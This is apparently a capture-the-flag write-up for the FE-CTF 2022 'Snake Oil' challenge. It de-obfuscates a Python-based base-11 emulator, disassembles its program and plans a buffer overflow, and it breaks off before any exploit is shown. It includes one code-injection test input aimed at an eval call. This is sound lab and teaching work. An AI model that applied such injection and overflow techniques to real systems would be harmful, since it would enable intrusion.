# Summary

The first part of this challenge is just like in [Snake
Jazz](https://gitlab.com/shalaamum/ctf-writeups/-/blob/master/FE-
CTF%202022/snake-jazz/writeup.md), but instead of being able to read off the
flag from memory, we will have to exploit a buffer overflow vulnerability to
gain remote code execution. Note: The files mentioned here can be found in
[this repository](https://gitlab.com/shalaamum/ctf-writeups/-/tree/master/FE-
CTF%202022/snake-oil).

# Obfuscation layer from "Snake Jazz"

This was pretty much like with the "Snake Jazz" challenge, so see my
[writeup](https://gitlab.com/shalaamum/ctf-writeups/-/blob/master/FE-
CTF%202022/snake-jazz/writeup.md) for more details.

We are given two files, `runme.py` and `magic.py`. Executing the former we are
prompted to enter our name, and are then greeted with our name, followed by a
warning:  
```  
Please enter your name  
> testname  
Hello, testname  
Don't break anything, kthxbai  
```

In `runme.py` we first import `magic.py`, which will define `_`. Then a huge
expression involving `_` and various binary operations is evaluated. In
`magic.py`, a `class B` is defined, and `_` is just defined as `B()`. Having
already done "Snake Jazz", looking at the code it seems very plausible that
again only deletion of `B` objects is the part of the execution that has
effects we should focus on. So we again modify `magic.py` to print out calls
to `__del__` that pass the initial `if not __.c:return` check, which was done
in `magic2.py` and `runme2.py`.

If we execute `runme2.py` we obtain (additionally to what we already had) the
following output:  
```  
__del__ called, object to reproduce:  
B(a=0x9103cf41a564e0c7d5c8026456b4ee384bfce6324d999493e2a2cf4e060cf6f20faa30c012de6b7fb95a93947d84a57774af31576b2cf7e6439ccb408bfec812e5f81ba582d39f29c07d47e27175a126d4da318264318209dfe4723431f42a8525259c2f11e4deb5150aa83ca6412c5832f7a8a63da96e98121be5c1715411f7517e60f931bc9ca052b5a104f5f7e7f022d584ff5d57e1c915e8a06f2d47f14c30ff7bda97a4dfa862129f018b92490c21e5724973cb2c1c9ea6178b3de251f0d99d56f24f7654317b383a98486624d345acf804f0126bf5644fbf87cf4f904120d94623a8c8de953ba2c376ceba1901c5d6a43a39573fbb2df9f5f98c176dd0376894ae6e05fbe8eebbadd0502cf649df73ec309a39c66f24eee62d53a9f264362054b78428e25c451c3c385809e46a8d92e1a284bf031a9265fbc84f588e4c855fd5666624d7c8d11067ddf4695e6c0273532dce64c8a17fa68a1eee2461725ecc5b52be3eeb368b53f8251803477351a566d9af09393b52251b0be5afabf69ce5dd18d4d9a0a5a85248d2ff96656ca6d2d7fb3d67bb02439690e4094b8eeee9539660e212ad6bf7e30ca882aba662a5aee944213c0f1241af7e579991c0343dbf47d700be90873aeef2863e4f3acb789a193e316250dfc0d72a1d3225076a0b5f8c2e724bbe95ad52391b0bfee1b9238a14a20f60e3f75ea367a81fac08c1dae778d5f0b1faa3a4bb33d6747b269e893172b0ba092af9b984423c05d6b955b4643803963e627f4417625e2ca04b849e2f84c32cea8413823783a0a384ac81e5779d194227873eaedce94a080ebc68cacd13b8f099e7c52658fa3835464c85bb6315d16d7cafa540c6d24dd0de4db27aafc730fc80d761e23f58f8532a1e2cd4ab0da165acd8beeff061f224c242b0104546615efff24f002404f4b64273d860816c0477c057eced1f33823d0e752c5876106ab3d26819bf8810526871fba5aeabe5d6bc8e8399a8f4e872ba2f42ab9bfdef04e4546a172685293f01c199447c0f5894d3b6acdfbae1dc80e578b0616c18c4361b7ef36573a3b06dc97507b85bd3794816f8864201cdb5edf51cd3e3f505a6e90927b78031815ee135a4ae39da7130979fb0ff1014a8a54e67af64c886ca6c5a9cdb3b61711e384e69f8ab52da091e07855ebcf91323d2113a6f06250838ae5c3078a814c7b9637901d0473b994bcf2e0eb23e68073f62cef494a4c40e3b2ace23e1163639a75bc4c37a05eaadf8e89909e3ae5a29023e0e16175ec1fd43b241d88dd1eae77af65f690,
b=0x85c,
c=0x9103cf41a564e0c7d5c8026456b4ee384bfce6324d999493e2a2cf4e060cf6f20faa30c012de6b7fb95a93947d84a57774af31576b2cf7e6439ccb408bfec812e5f81ba582d39f29c07d47e27175a126d4da318264318209dfe4723431f42a8525259c2f11e4deb5150aa83ca6412c5832f7a8a63da96e98121be5c1715411f7517e60f931bc9ca052b5a104f5f7e7f022d584ff5d57e1c915e8a06f2d47f14c30ff7bda97a4dfa862129f018b92490c21e5724973cb2c1c9ea6178b3de251f0d99d56f24f7654317b383a98486624d345acf804f0126bf5644fbf87cf4f904120d94623a8c8de953ba2c376ceba1901c5d6a43a39573fbb2df9f5f98c176dd0376894ae6e05fbe8eebbadd0502cf649df73ec309a39c66f24eee62d53a9f264362054b78428e25c451c3c385809e46a8d92e1a284bf031a9265fbc84f588e4c855fd5666624d7c8d11067ddf4695e6c0273532dce64c8a17fa68a1eee2461725ecc5b52be3eeb368b53f8251803477351a566d9af09393b52251b0be5afabf69ce5dd18d4d9a0a5a85248d2ff96656ca6d2d7fb3d67bb02439690e4094b8eeee9539660e212ad6bf7e30ca882aba662a5aee944213c0f1241af7e579991c0343dbf47d700be90873aeef2863e4f3acb789a193e316250dfc0d72a1d3225076a0b5f8c2e724bbe95ad52391b0bfee1b9238a14a20f60e3f75ea367a81fac08c1dae778d5f0b1faa3a4bb33d6747b269e893172b0ba092af9b984423c05d6b955b4643803963e627f4417625e2ca04b849e2f84c32cea8413823783a0a384ac81e5779d194227873eaedce94a080ebc68cacd13b8f099e7c52658fa3835464c85bb6315d16d7cafa540c6d24dd0de4db27aafc730fc80d761e23f58f8532a1e2cd4ab0da165acd8beeff061f224c242b0104546615efff24f002404f4b64273d860816c0477c057eced1f33823d0e752c5876106ab3d26819bf8810526871fba5aeabe5d6bc8e8399a8f4e872ba2f42ab9bfdef04e4546a172685293f01c199447c0f5894d3b6acdfbae1dc80e578b0616c18c4361b7ef36573a3b06dc97507b85bd3794816f8864201cdb5edf51cd3e3f505a6e90927b78031815ee135a4ae39da7130979fb0ff1014a8a54e67af64c886ca6c5a9cdb3b61711e384e69f8ab52da091e07855ebcf91323d2113a6f06250838ae5c3078a814c7b9637901d0473b994bcf2e0eb23e68073f62cef494a4c40e3b2ace23e1163639a75bc4c37a05eaadf8e89909e3ae5a29023e0e16175ec1fd43b241d88dd1eae77af65f690)  
```

The definition of `__init__` for `class B` in `magic2.py` does not actually
take `a`, `b`, and `c` as parameters, so we modify `__init__` to do so, so
that we can replace the complicated expression in `runme2.py` by a direct
construction of the required objects as seen in the output above. We
furthermore rename `__del__` to `run`, and remove various method functions
such as `__lt__` of `class B` that are now not needed anymore (this does not
require a lot of analysis, we can just delete some and see if the program
still runs as before). This leads us to `magic3.py` and `runme3.py`.

# Roman numerals obfuscation layer

Now we have simplified the original `runme.py` a lot, but `magic3.py` still
contains some obfuscation. At the start we find the following code that gets
executed on import, followed by definitions of `class A` and `class B`.  
```python  
import os,sys  
_ =
'aIaabVaacaXadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaLanaaaoaaapaaaqaaaraaa'\  
   'saaataaauaaavaaawaaaxaaayaaaCaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaab'\  
   'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaac'\  
   'eaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaac'\  
   'waacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaad'\  
   'paadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaae'\  
   'iaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaeDaaf'\  
   'baafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaf'\  
   'taafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaag'\  
   'maagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaah'\  
   'faahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaah'\  
   'xaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaai'\  
   'qaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaaj'\  
   'jaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajMaakbaak'  
def __(a):  
   b=sorted(_ for _ in enumerate(_)if _[True].isupper())[::~False]  
   c=''  
   d=False  
   f=a  
   while a:  
       if a>=b[d][False]:  
           c+=b[d][True]  
           a+=~b[d][False]+True  
           continue  
       if a>=b[d][False]*(9-b[d][False]//b[-~d][False]%2)//0o12:  
           a-=b[d][False]  
           e=min(_[False]for _ in b if a+_[False]>=False)  
           c+=dict(b)[e]  
           c+=b[d][True]  
           a+=e  
       d=-~d  
   setattr(sys.modules[__name__],c,f)  
   return c  
__(True)  
[__(_)for(_)in(range(I+I,I+I+I+I+I+I+I+I+I+I+I+I))]  
{__((XI**_-I)//II):__(XI**_-I)for(_)in(range(I,V))}  
```  
So there is a global variable `_` that starts out as a string, then a function
`__` is defined and called a bunch of times. We do not need to understand all
of the code in `__`, but the crucial side effect that we can notice is that it
sets a global variable in `setattr(sys.modules[__name__],c,f)`. So to keep
track of what is going on, let us add a  
`  
   print(f'{c} = {f}')  
`  
as the line before or after `setattr`. This change was done in `magic4.py` and
`runme4.py`. Executing `runme4.py` we obtain the following output.  
```  
I = True  
II = 2  
III = 3  
IV = 4  
V = 5  
VI = 6  
VII = 7  
VIII = 8  
IX = 9  
X = 10  
XI = 11  
V = 5  
X = 10  
LX = 60  
CXX = 120  
DCLXV = 665  
MCCCXXX = 1330  
MMMMMMMCCCXX = 7320  
MMMMMMMMMMMMMMDCXL = 14640  
Please enter your name  
> testname  
Hello, testname  
Don't break anything, kthxbai  
```

From this we can speculate that the `__` function is likely only called at the
start (so not in the `run` function), and its purpose is to set up global
variables whose name is a roman numeral and whose value is the corresponding
integer (In the case of `I` the value is not the integer `1` but instead
`True`. This is probably intended to further confuse the person reverse
engineering this; in the context `I` is actually used, `True` seems to act
identically to `1` (which we can verify empirically).). So in `magic5.py` we
remove the definition of `_` and `__` as well as the three lines calling `__`,
and replace them by direct definitions of `I`, `II`, and so on. Trying
`runme5.py`, we can see that there are no exceptions and behavior appears
unchanged. We can next remove usage of these constants and replace them by
their value, arriving at `magic6.py` and `runme6.py`, where we also changed
some `False` to `0` and `True` to `1`, and cleaned up the code here and there.
While doing so we might notice that `MCCCXXXI` appears somewhere even though
that should not be defined. That line does not seem to be reached though.

# Analysis of the emulated machine

Quickly skimming the code left in `magic6.py` we can see that this again seems
to emulate some machine that this time is using base 11 rather than 3 for its
memory. In the loop running the program there is again a long case distinction
for the different instructions, but beginning with  
```python  
           if False:  
               print(open('flag').read())  
```  
which seems to be intended as a hint that we will need to access a file `flag`
on the remote instance of this challenge, and will not be able to expect to
extract the flag from memory as was the case in "Snake Jazz". This will
require deeper analysis of the actual program being run by the emulator than
just figuring out how to print out the memory.

## Understanding how input and output happens

Apart from code that carries out arithmetic operations or shuffles data
around, there are two places that seem interesting and might interact with
input from the user, the `class A`, and the `elif c==10:` branch in `run`.  
`class A` is defined as follows.  
```python  
class A(object):  
   def __pos__(_):  
       return sys.stdin.buffer.read(1)[0]  
   def __add__(_,__):  
       sys.stdout.buffer.write(bytes([__]))  
       sys.stdout.buffer.flush()  
   def __mul__(_,__):  
       for __ in __.encode('latin1'):  
           _+__  
```  
`class A` provides reading from `stdin` and writing to `stdout`. If `a` in an
object of type `A`, then `+a` will return one byte (as an integer) read from
`stdin`, and if `text` is a string, then `a * text` will write the string
`text`, encoded in `latin1`, to `stdout`.  
There is only one place where an object of type `A` occurs, namely as the
local variable `_` in the method `run` of `class B`, defined right at the
start. However there is no place this variable seems to be directly used
(there are a couple of occurrences of `_`, where this though refers to a new
local variable, as in `a=[(_%11**5)for(_)in(a)]`).

Let us now look at the other interesting part we identified, the `elif c==10:`
branch in `run`. There we find the following.  
```python  
           elif c==10:  
               a[d]=eval((__.a//11**(a[e]*5)%11**(a[f]*5)).to_bytes(a[f]*3,'little').decode('latin1').strip('\0'))or(0)  
```  
So here some Python code is being evaluated. We can speculate that this will
either read the input from the user directly, or use `class A`, perhaps
through the local variable `_`. To find out what is going on with this `eval`,
let us split up this long line a bit and print out what is being evaluated.  
So let us replace the above code with the following.  
```python  
           elif c==10:  
               string_to_evaluate = (__.a//11**(a[e]*5)%11**(a[f]*5)).to_bytes(a[f]*3,'little').decode('latin1').strip('\0')  
               eval_result = eval(string_to_evaluate)  
               print(f'\neval("{string_to_evaluate}") = {eval_result}')  
               a[d] = eval_result or (0)  
```  
This is done in `magic7.py`. Executing `runme7.py` we obtain the following
output:  
```  
Please enter your name  
>  
eval("_*'Please enter your name\n> '") = None  
testname

eval("+_") = 116

eval("+_") = 101

eval("+_") = 115

eval("+_") = 116

eval("+_") = 110

eval("+_") = 97

eval("+_") = 109

eval("+_") = 101

eval("+_") = 10  
Hello,  
eval("_*'Hello, '") = None  
testname

eval("_*'testname\n'") = None  
Don't break anything, kthxbai

eval("_*'Don\'t break anything, kthxbai\n'") = None

```  
So this confirms that evaluation of `+_` is used to obtain input from `stdin`
byte by byte, stopping at the newline, and `_*` concatenated with a string
literal is used to write strings to `stdout`.

We can try here if we can immediately use our input to execute Python code. If
we input `testname' + print("It worked!") + '`, we might hope that the string
`_*'testname' + print("It worked!") + ''` will be evaluated. However, we will
get that what is actually evaluated is `_*'testname? + print("It worked!") +
?\n'`. So single quotes seem to be replaced by question marks before
evaluation. Similarly backslashes seem to be removed. So exploiting the
program is not as easy as this.

## Registers and memory

The `run` function begins as follows.  
```python  
   def run(__):  
       if not __.c:return  
       _ = A()  
       a = [0]*11  
       while 10:  
           a=[(_%11**5)for(_)in(a)]  
           b=__[a[0]]  
           a[0] += 1  
           b,c=divmod(b,11)  
           b,d=divmod(b,11)  
           b,e=divmod(b,11)  
           b,f=divmod(b,11)  
           b,g=divmod(b,11)  
           h=f+g*11  
           i=e+h*11  
           j=d+i*11  
```  
So `a` is a list of 11 `int`s, initially all zero. If we look at the `elif`
branches within the loop we will be able to find a lot of uses of the
components of `a`, both reading them as well as setting them to a different
value. This is very suggestive that we should interpret the components of `a`
as registers.

The very first line can then be interpreted as taking every register modulo
`11**5`, so each register is likely supposed to hold a 5-digit nonnegative
number to base 11, and this first line in the loop is handling any overflow or
underflow that might have happened in the previous loop round. This already
suggests that we are likely dealing with a machine that is using base 11, and
where each memory unit is 5 digits wide.

The `elif` branches later depend on the value of `c`, which thus likely holds
the type of instruction being executed. We see that `c` is defined as the
remainder of `__[a[0]]` modulo 11. From this we can guess that `__[address]`
is likely a memory access, and `a[0]` is the instruction pointer. Furthermore,
as `a[0]` is incremented by 1 rather than 5 we can also guess that memory is
likely addressed by 5-digit base-11 words, and not digit-wise, as was the case
in "Snake Jazz", where program code and data used a different word width and
thus memory was addressed by the digit.

If we look at the definition of `__getitem__` and `__setitem__`, which are
reproduced below, we can see that the member variable `a` of the `class B` is
an integer that stores the memory; that number is interpreted in base 11, the
digits are grouped together in words of 5 digits each, and those words can be
read and written individually. See the [writeup for "Snake Jazz"](todo link)
for a more detailed discussion on this system of encoding memory.  
```python  
   def __getitem__(_,__):  
       __%=11**5  
       __*=5  
       return _.a//11**__%11**5  
   def __setitem__(_,__,___):  
       ____=_[__]  
       __%=11**5  
       __*=5  
       _.a+=(___-____)*11**__  
```

As a next step we can now produce `magic8.py` and `runme8.py`, where we made
the code more readable by replacing various variable names. Note that we can
*not* rename the local variable `_` defined at the start of `run`, because
that is used in the evaluation, as we saw earlier.

One additional change from `magic7.py` to `magic8.py` should be noted.  
If we go back to the `elif c==10` branch in `run`, we (after renaming the
variables) have the line  
```python  
               string_to_evaluate = (self.a//11**(REG[e]*5)%11**(REG[f]*5)).to_bytes(REG[f]*3,'little').decode('latin1').strip('\0')  
```  
which we can now rewrite as follows.  
```python  
               memory_from_reg_e_of_len_reg_f = ( self.a // (11**(REG[e]*5)) ) % (11**(REG[f]*5))  
               string_to_evaluate = memory_from_reg_e_of_len_reg_f.to_bytes(  
                       REG[f]*3,'little').decode('latin1').strip('\0')  
```  
The first line is the part in the first brackets; this extracts `REG[f]` many
words of memory starting with the word indexed by `REG[e]`, as an integer (in
little endian).  
The second line then converts this integer into `REG[f]*3` many bytes, also in
little endian. Note that  
`log_2(11**5) ≈ 17.3`, so each word of 5 base 11 digits requires 18 bits to
represent, and as `2*8=16 < 18 <= 24=3*8` this explains why `REG[f]*3` is used
here as the number of bytes.  
Finally, the result is decoded as `latin1` and zero bytes are stripped from
start and end.

We also modified the `print` telling us about the string being evaluated to
also inform us about the memory address of the buffer that was used, together
with its length.

## A first disassembler

To understand what the emulated program does we will need to understand the
individual instructions first.  
As an example, let us look at the first two instruction types.  
```python  
           elif c==5:  
               REG[REGNUM_RIP] += j-7320  
           elif c==2:  
               REG[d] = self[REG[e]+f-5]  
               REG[e] += g-5  
```  
The first one is clearly a jump instruction. As `j` is a constant extracted
from the instruction, this is a jump to a fixed target. If we want to
disassemble such an instruction we might represent it by `JMP n` where `n`
will be the content of the instruction pointer `RIP` after the line has been
executed.  
The second instruction type loads a register from memory, with the address
determined by another register, and then that register is changed by a
constant. What this instruction does in general is a bit less clear, but it
would make sense as a `POP` instruction, popping a value off the stack, with
`REG[e]` being the stack pointer. To really understand this instruction we
might have to see how it is used in the program and what values `e` and `f`
and `g` tend to have.

In `magic9.py`, various changes have been made to improve our ability to
analyze the program code that is being emulated. First, the output from the
program itself as well as having to input a name is inconvenient. We thus
modify `class A` as well as `run` so that the input is given as an argument to
`run`, and output is printed to `stderr`. (This last change is just because
this makes it very easy to redirect our debug output to a file while still
seeing whether the output looks ok so that our changes did not break the
program. It would perhaps be more usual to assign `stdout` and `stderr` the
other way around, but like this just happens to be the quickest (least amount
of typing) in this case, with in the end equivalent effect.) Then we add
functions `disassemble_instruction` and `print_disassembly`, the first of
which takes an address as an argument and returns a string that is supposed to
explain what the instruction at that address does, the second prints out a
disassembly of all of memory, or a subset of the words, passed by argument. To
know which addresses actually hold instructions, we modify `run` to save the
instructions that have been visited. This already prevents us from wasting
time trying to make sense of memory interpreted as instructions that actually
hold data or junk. But we might also waste time if parts of the program get
decrypted in execution. Thus we modify the memory write function `__setitem__`
to warn if a memory address that contains program code is being changed. If we
can run the program twice (once to populate the set addresses the instruction
pointer visited, and then a second time to obtain the warning messages)
without getting such a warning, then we know that no decryption of code that
is reached if we enter `testname` as our name in the prompt. It is still
possible that instructions that are not actually reached with such an input
get decrypted or reached with a different input, but if that were the case we
could figure out what we need to know later after we realized how to enter
such a different codepath.

Running `runme9-check-no-decryption.py` runs `run` twice as just suggested,
and we can see that we can *not* see any warnings regarding program
instruction addresses being written to, so the code is not encrypted.

Executing `runme9-disassemble-with-holes.py` instead outputs a disassembly on
`stdout`, showing the instructions that are reached in the usual `run`.
Skimming over it we see that there are some parts looking like the following
lines.  
```  
0015:   IF REG1 != REG7 THEN JMPNEXT

...jumped over 1 words...

0017:   REG7 = 92  
```  
So there is a instruction that conditionally jumps over the next instruction,
and there is a hole of only this one instruction not being reached. It might
be nicer to also show a disassembly for those. Thus in `runme9.py` we remove
gaps of length only 1. The output on `stdout` is provided as `disassembly9`.

## Improving the disassembler

In `disassembly9` we can see various sequences of instructions, separated by
gaps of different length. The two shortest consecutive sequences of
instructions begin at address `117` and `145`. Let us consider the first of
the two.  
```  
0117:   MEM[REG10 + -1] = REG9  ;  REG10 += -1  
0118:   REG2 = REG1  
0119:   REG1 = 125  
0120:   REG9 = RIP  ;  JMP 145  
0121:   REG7 = 125  
0122:   REG1 = EVALUATEPY MEM[REG7:REG7+REG1]  
0123:   REG9 = MEM[REG10 + 0]  ;  REG10 += 1  
0124:   JMP REG9  
```  
The value of `REG9` seems to be saved in memory at the start, and recovered at
the second to last line, followed by a jump to this recovered value of `REG9`.
Furthermore the one other jump occurring in this short piece of code sets
`REG9` to the value of `RIP` at that point (note that this is the address of
the *next* instruction to be executed, so when the assignment of instruction
`120` is carried out, the value of `RIP` is already `121`). This suggests that
part of the function call convention being used is that `REG9` holds the
return address. Additionally, the way `REG9` is saved and recovered from
memory looks like `REG10` might be a stack pointer, with the stack growing
downwards, and the instructions at `117` and `123` being a `PUSH` and `POP`
instruction, respectively. Other places in the disassembly, for example the
function that seems to span from `145` to `210`, also seem to fit with these
interpretations.

Considering further the snippet from `117` above, note that `REG1` being
copied to `REG2` implies that `REG1` most likely has some significance here,
for example by virtue of being an argument passed to this function. Before
calling the function at `145`, the register `REG1` is set to a constant value.
We can guess that arguments are most likely passed via register, in the order
`REG1`, `REG2`, and we can guess that this continues with `REG3`, etc., though
we do not see this here yet. Then the function at `117` likely takes one
argument, and the one at `145` takes two. Skimming over other parts of the
disassembly they again seem to fit with this interpretation.

So let us make the disassembly more readable by incorporating some of what we
have learned and abbreviating e.g. the instruction at `117` with `PUSH REG9`
and the instruction at `123` with `POP REG9`. It also seems reasonable to give
`REG9` and `REG10` the names `RETADDR` and `RSP`. Furthermore, we can
abbreviate the combination of `REG9 = RIP` with a jump by `CALL` and `JMP
RET9` by `RET`.

Additionally, it would be useful to identify function starts and ends. We can
identify returns from functions by `JMP REG9`, but it may not always be clear
where a functions starts. To help we will add a ">" in the output between
address and disassembly if this is an address that was jumped to during
execution. We add `>>` if that address was jumped to with a `CALL`
instruction.

The mentioned changes have been implemented in `magic10.py` and `runme10.py`,
and the output can be found in `disassembly10`.

# Analysis of the program

Let us now begin actually looking at disassembled functions, trying to
understand what they do.

## Understanding some short and easy functions

Starting from the bottom we have the following short function.  
```  
0399: >>  REG7 = 403  
0400:     REG8 = 1  
0401:     REG1 = EVALUATEPY MEM[REG7:REG7+REG8]  
0402:     RET  
```  
It evaluates the string encoded by memory at address `403`. From the output of
`runme8.py` we know that this string is (unless it gets changed during
execution) "+_", so this function could be given the name `read_char()`, where
we use the brackets to indicate that this function does not take arguments.

We then have the following slightly longer function.  
```  
0390: >>  IF REG3 != 0 THEN JMPNEXT  
0391:     JMP 398  
0392:  >  REG7 = MEM[REG2 + 0]  
0393:     MEM[REG1 + 0] = REG7  
0394:     REG1 += 1  
0395:     REG2 += 1  
0396:     REG3 += -1  
0397:     JMP 390  
0398:  >  RET  
```  
In pseudocode this function is  
```C  
while(REG3 != 0)  
{  
 MEM[REG1] = MEM[REG2]  
 REG1 += 1  
 REG2 += 1  
 REG3 -= 1  
}  
```  
Hence this function copies `REG3` words of memory from the buffer pointed to
by `REG2` to the one pointed to by `REG1`. We can call this function
`memcpy(dest, src, length)`.

Finally, the third short function at the bottom is the following:  
```  
0381: >>  REG8 = 0  
0382:  >  REG7 = MEM[REG1 + 0]  
0383:     IF REG7 != 0 THEN JMPNEXT  
0384:     JMP 388  
0385:  >  REG8 += 1  
0386:     REG1 += 1  
0387:     JMP 382  
0388:  >  REG1 = REG8  
0389:     RET  
```  
This returns the number of words before the zero word occuring at the memory
pointed to by `REG1`, and we can call this function `len_until_zero(pointer)`.

The last low hanging fruit function is the one at `215`, reproduced below.  
```  
0215: >>  REG4 = 0  
0216:  >  IF REG3 != 0 THEN JMPNEXT  
0217:     JMP 228  
0218:  >  REG7 = MEM[REG1 + 0]  
0219:     REG7 = REG7 * REG2  
0220:     REG7 = REG7 + REG4  
0221:     REG8 = 256  
0222:     REG4 = REG7 // REG8  
0223:     REG7 = REG7 % REG8  
0224:     MEM[REG1 + 0] = REG7  
0225:     REG1 += 1  
0226:     REG3 += -1  
0227:     JMP 216  
0228:  >  RET  
```  
This is a loop, changing the contents of a buffer pointed to by `REG1` of
length `REG3`. The instructions from `219` to `223` can be summarized as
follows.  
```  
multiply_add = ((MEM[REG1] * REG2) + REG4)  
REG4 = multiply_add // 256  
REG7 = multiply_add % 256  
```  
We can thus interpret this function as follows: The buffer is interpreted as a
little endian number `x`, in base `256`. The function takes two arguments `a`
and `b` as `REG2` and `REG4`, and calculates `x*a + b`. The result is written
back into the buffer, in base `256`, also little endian. Note that the words
are not checked to contain an integer between `0` and `255`, so it is possible
to use this function to convert a single nonnegative integer up to `11**5 - 1`
into base `256`, as long as the buffer is large enough to hold the result. Let
us call this function `multiply_add_base_256(pointer, factor, length,
summand)`.

## Adding function names to the disassembler

To avoid having to look up or remember the addresses of functions we already
identified, we have in `magic11.py` and `runme11.py` added support for
printing out function names in the disassembly, including for `CALL`
instructions. The new output is provided as `disassembly11`.

## The entry function

Let us now try to understand what the program does from the top level.
Initially `RIP=0`, so program entry is at the start, where we find the
following:  
```  
0000:     RSP = 550  
0001:     REG1 = 37  
0002:     CALL 117  
0003:  >  REG5 = 404  
0004:     REG7 = 95  
0005:     REG8 = 42  
0006:     REG4 = 39  
0007:     MEM[REG5 + 0] = REG7  ;  REG5 += 1  
0008:     MEM[REG5 + 0] = REG8  ;  REG5 += 1  
0009:     MEM[REG5 + 0] = REG4  ;  REG5 += 1  
0010:  >  CALL read_char()  
0011:  >  REG7 = 10  
0012:     IF REG1 != REG7 THEN JMPNEXT  
0013:     JMP 22  
0014:  >  REG7 = 39  
0015:     IF REG1 != REG7 THEN JMPNEXT  
0016:     REG1 = 63  
0017:  >  REG7 = 92  
0018:     IF REG1 != REG7 THEN JMPNEXT  
0019:     REG1 = 63  
0020:  >  MEM[REG5 + 0] = REG1  ;  REG5 += 1  
0021:     JMP 10  
0022:  >  REG7 = 92  
0023:     REG8 = 110  
0024:     REG4 = 39  
0025:     REG3 = 0  
0026:     MEM[REG5 + 0] = REG7  ;  REG5 += 1  
0027:     MEM[REG5 + 0] = REG8  ;  REG5 += 1  
0028:     MEM[REG5 + 0] = REG4  ;  REG5 += 1  
0029:     MEM[REG5 + 0] = REG3  ;  REG5 += 1  
0030:     REG1 = 68  
0031:     CALL 117  
0032:  >  REG1 = 404  
0033:     CALL 117  
0034:  >  REG1 = 80  
0035:     CALL 117  
0036:  >  HALT  
```  
We can immediately see that there are five calls to other functions, one being
`read_char()`, and the other four the function at `117`. We can guess that the
function at `117` is likely a print function, as we with e.g. `runme8.py` can
see that there are exactly four prints happening in the program, and there is
exactly one before input is taken from `stdin`, which fits with the order we
see the calls here as well. From the calls here we can guess that the function
at `117` likely takes one argument, the address of the string to be printed
out, though we do not yet know in what format that data is.

In `magic12.py` and `runme12.py` we have provisionally added a name for the
function at `117`, and also added showing the characters corresponding to
numeric values, to understand e.g. the checks done with the return value of
`read_char()` better (without having to consult an ASCII table).

The output for the function at the start now looks like the following.  
```  
0000:     RSP = 550  
0001:     REG1 = 37 = b'%'  
0002:     CALL print_unknown_format(pointer)  
0003:  >  REG5 = 404  
0004:     REG7 = 95 = b'_'  
0005:     REG8 = 42 = b'*'  
0006:     REG4 = 39 = b"'"  
0007:     MEM[REG5 + 0] = REG7  ;  REG5 += 1  
0008:     MEM[REG5 + 0] = REG8  ;  REG5 += 1  
0009:     MEM[REG5 + 0] = REG4  ;  REG5 += 1  
0010:  >  CALL read_char()  
0011:  >  REG7 = 10 = b'\n'  
0012:     IF REG1 != REG7 THEN JMPNEXT  
0013:     JMP 22  
0014:  >  REG7 = 39 = b"'"  
0015:     IF REG1 != REG7 THEN JMPNEXT  
0016:     REG1 = 63 = b'?'  
0017:  >  REG7 = 92 = b'\\'  
0018:     IF REG1 != REG7 THEN JMPNEXT  
0019:     REG1 = 63 = b'?'  
0020:  >  MEM[REG5 + 0] = REG1  ;  REG5 += 1  
0021:     JMP 10  
0022:  >  REG7 = 92 = b'\\'  
0023:     REG8 = 110 = b'n'  
0024:     REG4 = 39 = b"'"  
0025:     REG3 = 0 = b'\x00'  
0026:     MEM[REG5 + 0] = REG7  ;  REG5 += 1  
0027:     MEM[REG5 + 0] = REG8  ;  REG5 += 1  
0028:     MEM[REG5 + 0] = REG4  ;  REG5 += 1  
0029:     MEM[REG5 + 0] = REG3  ;  REG5 += 1  
0030:     REG1 = 68 = b'D'  
0031:     CALL print_unknown_format(pointer)  
0032:  >  REG1 = 404  
0033:     CALL print_unknown_format(pointer)  
0034:  >  REG1 = 80 = b'P'  
0035:     CALL print_unknown_format(pointer)  
0036:  >  HALT  
```  
So it seems this function begins by printing the "Please enter your name"
message first. Then our input is written to a buffer beginning at address
`404`, after first writing `_*'` into it. If the character read from `stdin`
is a single quote or backslash it is replaced by `?`, as we observed earlier.
After the character read from `stdin` is a newline, reading stops and a
backslash, `n`, and single quote are appended, as well as a zero word.
Finally, the "Hello, " string, the string just composed from our input, and
finally the warning string are printed.

By seeing how the users name is read and the function that was provisionally
called `print_unknown_format` called we can also deduce that this function
likely actually executes python code that is stored at the pointer in base
`256`, and terminated by zero. So we rename this function
`eval_python_base_256(pointer)`.

Note that the stack begins at `550` and grows downwards, and the buffer
holding our input begins at `404` and grows upwards, which suggests there
might be a possibility of having them overlap if our input was long enough. We
currently don't have enough information to exploit this, but will come back to
this in a bit.

## The function `eval_python_base_256(pointer)`

The function is given by the following:  
```  
0117: >>  PUSH RETADDR  
0118:     REG2 = REG1  
0119:     REG1 = 125 = b'}'  
0120:     CALL 145  
0121:  >  REG7 = 125 = b'}'  
0122:     REG1 = EVALUATEPY MEM[REG7:REG7+REG1]  
0123:     POP RETADDR  
0124:     RET  
```  
As the `EVALUATEPY` instruction expects the string to be stored in base
`11**5`, we can guess that the function at `145` likely takes two arguments, a
destination and source address, and copies the null-terminated base `256` data
in the source to the destination, now in base `11**5`.

In `magic13.py` and `runme13.py` we have thus given the function at `145` the
name `memcpy_from_base256_to_base_161051(dest, src)`. Furthermore we have
modified the detection of addresses being jumped to so as to not count return
jumps, so that we can see where loop boundaries in that function are, which
will be relevant in a bit. The output can be found in `disassembly13`. As the
function `memcpy_from_base256_to_base_161051(dest, src)` is a bit long it
would be good to confirm what it does by observing the behavior. Hence
